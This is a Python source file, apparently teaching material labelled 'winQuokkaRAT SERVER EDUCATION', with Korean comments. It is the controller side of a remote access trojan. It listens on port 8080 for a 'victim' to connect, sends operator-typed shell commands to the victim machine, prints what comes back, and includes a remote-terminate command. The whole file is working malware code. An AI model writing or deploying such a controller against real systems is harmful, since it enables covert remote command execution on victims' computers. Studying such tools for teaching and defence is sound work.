#attack_server.py

import socket
import os

HOST = '0.0.0.0' # 모든 IP 주소의 접속 허용 
PORT = 8080 # 사용할 포트 번호 

# 소켓 바인딩 및 리스닝 
def bind_listen(sock, host, port):
    try:
        sock.bind((host, port)) # 주어진 IP와 포트에 소켓 바인딩 
        print(f"Listening : {port}")
    except socket.error as e:
        print(f"Listening Fail : {e}")
        os.system('pause')  # 에러 발생 시 사용자 입력 기다림
    sock.listen(1)  # 클라이언트 접속 기다림 
    print('Waiting for victim connection...')

# 콘솔 화면 clear 함수 
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# 클라이언트에게 메시지 전송 및 응답을 받는 함수 
def send_and_recv(conn_param, message):
    BUFFER_SIZE = 50000
    # 빈 패킷을 보내지 않도록 처리 
    if (message == ''):
        print("null message error...")
        return 0
    conn_param.send(message.encode())   # 메시지를 인코딩해서 클라이언트에게 전송 
    print("wait for client message...")
    recved = conn_param.recv(BUFFER_SIZE).decode('utf-8')   # 클라이언트 응답 수신 
    print(recved)
    return recved

print("########## winQuokkaRAT SERVER EDUCATION ##########")
my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 소켓 생성 

# 소켓 바인딩 시도 
while(True):
    try:
        bind_listen(my_sock, HOST, PORT)
        break
    except Exception as e:
        print(e)
        print(f"port 사용중 : {PORT}")

conn, addr = my_sock.accept()   # 클라이언트 접속 허용 
print('\n')
print('Connected by', addr)

# 사용자의 입력을 받아 클라이언트에게 전송 
while True:
    try:
        cmd = input('$')
        # 빈 버퍼를 보내면 상대가 받지 못해서 무한 교착상태 발생 (입력값이 비어있지 않을 때만 실행) 
        if(len(cmd)>0):
            if(cmd=="cls"):
                clear_console() # 콘솔 화면 clear 
            elif(cmd[:4]=="term"):
                print("Remote Terminate Executed")
                send_and_recv(conn, cmd)    # term 명령 전송 
            else:
                send_and_recv(conn, cmd)    # 그 외 명령 전달 
    except Exception as e:
        print(e)
        os.system("pause")  # 에러 발생 시 사용자 입력 대기 